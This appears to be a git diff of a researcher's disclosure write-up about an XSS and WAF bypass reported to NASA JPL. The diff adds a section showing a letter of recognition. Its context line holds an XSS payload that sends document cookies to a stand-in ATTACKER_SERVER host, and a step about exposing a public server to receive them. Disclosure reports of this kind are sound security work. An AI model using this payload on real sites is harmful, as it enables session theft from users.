@@ -140,6 +140,20 @@ Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>
 
 ---
 
+## 🎖️ Recognition & Award
+
+Following the ethical disclosure, I received a **Letter of Recognition** from the **NASA Jet Propulsion Laboratory (JPL)** acknowledging the impact of the research and its contribution to the security of their assets.
+
+<div class="pdf-container">
+  <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" width="100%" height="100%" frameborder="0"></iframe>
+</div>
+
+<p style="text-align: center;">
+  <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
+</p>
+
+---
+
 ## 🎯 Steps To Reproduce
 
 1. Start a public web server (e.g., using Serveo exposing a python localhost server).
@@ -156,4 +170,3 @@ This research was conducted in a **50/50 collaboration** between **{{ site.resea
 
 **{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
 **{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
-
